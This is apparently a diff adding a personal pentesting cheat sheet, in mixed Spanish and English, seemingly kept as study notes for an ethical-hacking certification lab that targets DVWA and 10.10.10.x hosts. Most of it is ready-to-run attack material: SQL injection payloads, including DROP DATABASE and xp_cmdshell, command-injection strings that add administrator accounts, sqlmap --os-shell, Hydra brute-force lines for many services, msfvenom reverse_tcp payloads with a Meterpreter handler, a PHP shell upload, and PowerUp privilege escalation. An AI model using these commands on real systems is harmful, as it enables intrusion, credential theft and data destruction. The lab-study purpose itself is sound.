@@ -1,0 +1,283 @@
+Telnet
+telnet ip puerto
+telnet pagina 80
+GET / HTTP/1.0
+
+Responder
+Responder -I(i) eth0 -rdw
+Guarda por defecto en Home/Responder/logs
+
+Hashc:
+Windows :
+	Hashcal
+	Hashmyfiles 
+	MDcalc
+
+Snow:
+snow -C -m “mensaje a ocultar” -p “contraseña” archivo_original.txt archivo_destino.txt
+Snow -C -p “contraseña” archivo_destino.txt
+
+Steghide:
+ $ steghide embed -cf picture.jpg -ef secret.txt
+ Enter passphrase:
+ Re-Enter passphrase:
+ embedding "secret.txt" in "picture.jpg"... done
+
+$ steghide extract -sf picture.jpg
+ Enter passphrase:
+ wrote extracted data to "secret.txt".
+
+SqlMap:
+sqlmap -u “pagina” –cookie “ ”  - -dbs
+sqlmap -u “pagina” –cookie “ ” -D base_de_datos --tables
+sqlmap -u “pagina” –cookie “ ” -D base_de_datos -T tabla - -columns
+sqlmap -u “pagina” –cookie “ ” -D base_de_datos -T tabla – C columna1,columna2 - -dump
+--os-shell
+
+Sql Injection
+blah';insert into login values ('john','apple123'); --
+blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t';
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1—
+
+‘ Union select parametro1,parametro2 from tabla # 
+*no usar # si está el parámetro en una lista
+"mysql_real_escape_string()" > “valor_real or 1=1”
+
+Desde otra página 
+1' union select user, password from users#
+1' union select user, password from users-- -
+
+‘ or 1=0 union select version(), user from dvwa.users#
+Union select user(),version(),database(); -> muestra usuario y version.
+
+
+Probe hostname: | hostname
+User, privileges: | whoami
+List of running process: | tasklist
+Kill task: | taskkill <PID of process to kill> /F
+View C dir: | dir C:\
+View accounts: | net user
+View account info: | net user <name>
+Add user: | net user <name>/Add 
+Grupos: | net localgroup 
+	| net localgroup Administrators Test /Add
+
+Username: blah’ or 1=1 --
+Insert username: blah';insert into login values ('john','apple123'); --
+Insert new database: blah';create database <mydatabase>; --
+Delete database: blah'; DROP DATABASE mydatabase; --
+Ping another web:blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
+
+CONTRASEÑAS:
+
+John the Ripper
+John - -list=formats
+John - -format=formato –wordlist=diccionario hash
+*nombre de usuario se agrega el inicio del hash separado por :   nombre:hash
+John --single
+ZIP: zip2john archivo.zip > hash_zip.txt
+RAR:rar2john archive.rar> hash_rar.txt
+
+WpScan
+wpscan - -api-token token - -ulr pagina - -plugins-detection aggressive
+wpscan  - -ulr pagina --enumerate u
+wpscan  - -ulr pagina --passwords archivo_password --username usuario
+
+--enumerate :
+		p-> plugin
+		t-> template
+		u-> usuarios
+wpscan --api-token [API Token from Step#25] --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate vp
+service postgresql start
+msfconsole
+search wordpress_login
+set rhost,report,pass_file,targeturi,username
+
+DVWA
+msfvenom -p php/merterpreter/reverse_tcp LHOST=10.10.10.13 LPORT= -f raw
+copiar codigo y exportar .php
+subir php
+msfconsole
+use exploit/multi/handler
+	set payload php/meterpreter/reverse_tcp
+	set LHOST 10.10.10.13
+	set LPORT 4444
+	run
+entrar en http://10.10.10.16:8080/dvwa/hackable/uploads/upload.php
+Hydra
+Apt-get install libssh-dev
+Cd hydra
+sudo make clean
+./configure
+sudo make install
+
+hydra  -l ‘usuario’ -P diccionario.txt 192.168.0.10 http-get form“/ruta/hasta/form/: username=^USER^& password=^PASS^&Login=Login:F=error:H=Cookie: pegar_cookie; security=low”
+
+hydra -l usuario -P Word_list 10.10.10.10 ssh
+Parametros:
+	-s = puerto
+	-t = 
+	-V = verbose
+hydra -l root -P passwords.txt [-t 32] <IP> ftp
+hydra -L usernames.txt -P pass.txt <IP> mysql
+hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+hydra -P common-snmp-community-strings.txt target.com snmp
+hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+hydra -l root -P passwords.txt <IP> ssh
+
+Nmap:
+netdiscover -i eth0
+nmap ip 
+nmap -sV -v --script nbstat.nse
+nmap ip -p puertos -A -O -sV -sC -T4 -oN nombre_archivo
+nmap -sV –script=http-enum
+Ver SO -> nmap -O <IP/RED>
+Ver hosts con puerto abierto -> nmap -p <PUERTO> <RED>
+Ver versión del servicio -> nmap -sV <IP/RED>
+Enumerar mediante ICMP -> nmap -sC <IP/RED>
+nmap –script smb-os-discovery.nse 10.10.10.10
+nmap --script smb-enum-users.nse -p445 <host>
+sudo nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 <host>
+	
+snmp
+		nmap -sU -p 161 [IP]
+snmp-check [IP]
+-sn -PE pasa por FW
+--script smb-os-discovery.nse -> nombre del hosts, SO
+-f-> pasar FW
+-g ->spoof pueto
+-D
+-RND
+--data 0xdeadbeef
+--data-string “Ph34r my l33t skills”
+--randomize-hosts
+--script nbstat -p 139 -> enumera netbios
+--script=http-enum
+nmap -p80 --script http-waf-detect www.goodshopping.com
+
+Gobuster
+/usr/share/wordlists/
+gobuster dir -u pagina -w wordlist -e php,html
+-k salta invalid configuration
+gobuster dns -d mydomain.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+Wireshark:
+Spotting reflection attacks: udp.srcport == 53 or udp.srcport == 123
+TCP SYN floods: tcp.flags.syn == 1 and tcp.flags.ack == 0  -> comparer tcp.flags.ack == 1 deben tener mismo n+iumero de paq.
+http contains “<PALABRAS>”
+urlencoded-form
+host 10.10.10.10
+net 10.10.10.0/24
+src  net
+dst net
+and, &&
+or , ¡!
+Not equal ne !=
+Equal eq, ==,<,>
+Ip.add ==
+Ip.src ==
+Tcp.port==,udp.port ==
+http.request.method == POST edit/find packet -> packet detail/UTF-8/string
+
+/edit/preferences/protocols/arp-rarp/detec arp storm
+Analyze/expert information
+
+nbns -> ver nombre del host atacante
+bootp-> DHCP
+http.request and !(ssdp) -> Modelo y SO, http trafico
+eth.addr == 00:a0:cc:3b:bf:fa
+ip.addr==10.96.203.66 and tcp.port==80 &&!(ip.addr==10.121.1.161)
+
+Comandos
+Uname -r  -> versión de Kernel
+
+SCP
+Scp nombre@10.10.10.10 :nombre_archivo_a _descargar /destino/
+Scp nombre_archivo a subir nombre@10.10.10.10  /destino_servidor
+Si es carpeta agregar -r
+Si usa llave privada agregar -i /ruta_llave/
+
+Nikto
+nikto  -h 10.10.10.10 -o report.html
+--Plugin cgi,robots,dir_transversal
+-Display :
+	1 show any redirect
+	2 show any cookie received
+	E output any error
+Ping
+ping 10.10.10.10 -f -l(L)1500 -> fragmenta el paquete y da un largo de 1500
+-i ->ttl
+-n -> echo requests
+
+Cewl
+cewl example.com -m 5 -w words.txt
+-m -> largo mínimo de la palabra
+-n -e -> n oculta las palabras, e busca los correos electrónicos
+-c -> cuenta el número de palabras repetidas
+--with-numbers -> genera lista alfanumérica
+--auth_type: Básico.
+--auth_user: Nombre de usuario de autenticación.
+--auth_pass: Contraseña de autenticación.
+-w -> graba en unarchivo la salida
+
+Command injection
+| hostname
+| tasklist
+| taskkill /pid n° /F
+| net use
+| whoami
+| net user iron /add
+| net localgroup Administrators test /add
+| net localgroup
+
+
+Varios
+megaping_setup.exe
+snmp-check 10.10.10.10
+https://cwe.mitre.org/
+
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /root/Desktop/Test.exe
+mkdir /var/www/html/share and press Enter to create a shared folder
+Type chmod -R 755 /var/www/html/share and press Enter
+Type chown -R www-data:www-data /var/www/html/share and press Enter
+Copy the malicious file to the shared location by typing cp /root/Desktop/Test.exe /var/www/html/share and pressing Enter
+msfconsole
+et payload windows/meterpreter/reverse_tcp and press Enter
+set LHOST 10.10.10.13 and press Enter
+set LPORT 444 and press Enter
+exploit
+sysinfo
+upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1
+shell
+powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”
+enter
+exit
+wun vnc
+
+MSFVENOM -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw 
+
+rlwrap sudo apt-get install -y rlwrap
+
+nbtstat -a [IP] (Windows)
+nbtstat -c
+
+nmblookup -A ip 
+00>hostname
+Nbtscan ip
+
+Enum4linux 10.10.10.10
+
+searchexploit
+sudo apt update && sudo apt -y install exploitdb
+searchexploit -x –nmap archivo.xml
+
+
+
